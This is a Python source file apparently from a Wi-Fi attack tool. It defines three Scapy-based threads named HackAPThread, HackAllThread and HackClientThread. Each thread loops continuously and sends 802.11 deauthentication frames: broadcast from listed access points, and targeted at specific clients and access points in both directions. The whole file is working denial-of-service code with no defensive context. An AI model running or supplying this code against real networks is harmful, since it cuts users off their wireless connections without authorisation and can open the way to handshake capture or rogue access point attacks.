from scapy.layers.dot11 import Dot11, Dot11Deauth
from scapy.packet import ls
from scapy.sendrecv import send
import threading
import Channel

__author__ = 'daniel'


class HackAPThread(threading.Thread):
    def __init__(self, AP_list, clients_APs):
        threading.Thread.__init__(self)
        self.daemon = True
        self.flag = False
        self.AP_list = AP_list
        self.lock = threading.Lock()
        self.clients_APs = clients_APs

    def set_AP_list(self, AP_list):
        self.AP_list = AP_list

    def set_index_list(self, index_list):
        self.index_list = index_list



    def run(self):
        while True:
            if self.flag:
                raise Exception('Stop sending deauth packet')
            for ap in self.AP_list:
                address = ap[0]
                deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=address, addr3=address)/Dot11Deauth()
                send(deauth_ap, inter=0, count=5)
                print ls(deauth_ap)

            if len(self.clients_APs) > 0:
                with self.lock:
                    for x in self.clients_APs:
                        client = x[0]
                        ap = x[1]
                        ch = x[2]

                        deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
                        deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
                        send(deauth_pkt1, inter=0, count=1)
                        send(deauth_pkt2, inter=0, count=1)




class HackAllThread(threading.Thread):
    def __init__(self, AP_list):
        threading.Thread.__init__(self)
        self.daemon = True
        self.flag = False
        self.AP_list = AP_list

    def run(self):
        while True:
            if self.flag:
                raise Exception('Stop sending deauth packet')
            for ap in self.AP_list:
                address = ap[0]
                deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=address, addr3=address)/Dot11Deauth()
                send(deauth_ap, inter=0, count=1)
                print ls(deauth_ap)

class HackClientThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.daemon = True
        self.flag = False
        self.AP_list = None
        self.client = None

    def set_AP_list(self, AP_List):
        self.AP_list = AP_List

    def set_client(self, client):
        self.client = client

    def run(self):
        while True:
            if self.flag:
                raise Exception('Stop sending deauth packet')
            for ap in self.AP_list:
                address = ap[0]
                deauth_ap = Dot11(addr1=self.client, addr2=address, addr3=address)/Dot11Deauth()
                print ls(deauth_ap)
                send(deauth_ap, inter=0, count=1)
